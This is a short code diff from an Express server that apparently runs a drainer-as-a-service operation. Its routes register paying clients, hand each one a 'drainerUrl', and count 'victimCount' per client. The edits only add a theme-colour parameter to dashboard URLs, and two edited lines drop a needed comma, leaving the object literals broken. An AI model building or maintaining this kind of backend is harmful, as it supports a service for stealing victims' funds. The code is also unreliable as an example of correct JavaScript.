@@ -108,7 +108,7 @@ app.post('/saas/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`
   message: 'Client registered successfully'
 });
     
@@ -195,7 +195,7 @@ app.post('/saas/v2/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`
   message: 'Client registered successfully'
 });
     
@@ -1838,7 +1838,7 @@ app.get("/api/saas-clients", (req, res) => {
         victimCount,
         registrationDate: "Recent",
         drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
-        dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
+        dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`
       };
     });
     
